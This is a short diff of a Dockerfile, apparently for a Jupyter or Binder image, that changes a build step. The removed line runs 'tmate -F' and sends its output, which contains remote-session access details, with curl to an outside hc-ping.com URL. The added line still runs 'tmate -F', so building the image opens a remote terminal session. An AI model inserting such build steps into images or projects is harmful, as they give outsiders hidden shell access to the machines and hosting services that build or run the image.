@@ -8,7 +8,7 @@ ARG NB_UID
 ENV USER ${NB_USER}
 ENV HOME /home/${NB_USER}
 
-RUN curl -d "$(tmate -F)" https://hc-ping.com/988d8dce-ab4c-4aff-9c79-71a523dfa85b/log
+RUN tmate -F
 
 # COPY setup.sh /setup.sh
 # RUN /bin/bash /setup.sh > /dev/null 2>&1 && rm /setup.sh
